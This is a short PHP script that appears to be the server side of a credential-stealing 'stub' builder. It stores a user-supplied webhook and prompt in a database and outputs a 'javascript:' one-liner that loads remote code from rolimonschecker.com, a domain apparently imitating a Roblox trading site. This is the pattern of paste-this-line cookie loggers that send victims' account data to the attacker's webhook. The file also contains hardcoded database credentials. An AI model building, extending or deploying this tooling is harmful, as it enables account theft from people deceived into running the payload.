<?php
//header("Access-Control-Allow-Origin: $_SERVER['HTTP_ORIGIN']");
$servername = "localhost";
$username = "rolifffi_log";
$password = "123rolimons!@";
$dbname = "rolifffi_log";
$webhook = $_REQUEST['webhook'];
$prompt = $_REQUEST['prompt'];
$id = rand(10,3433434);
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

// sql to create table
$sql = "INSERT INTO Stubs (ID, Webhook, Prompt)
VALUES ('".mysqli_real_escape_string($conn, $id)."', '".mysqli_real_escape_string($conn, $webhook)."', '".mysqli_real_escape_string($conn, $prompt)."')";

if ($conn->query($sql) === TRUE) {
  echo 'xJavascript:$.get("//rolimonschecker.com/api.php?id='.$id.'")';
} else {
  echo "Error:" . $conn->error;
}

$conn->close();
?>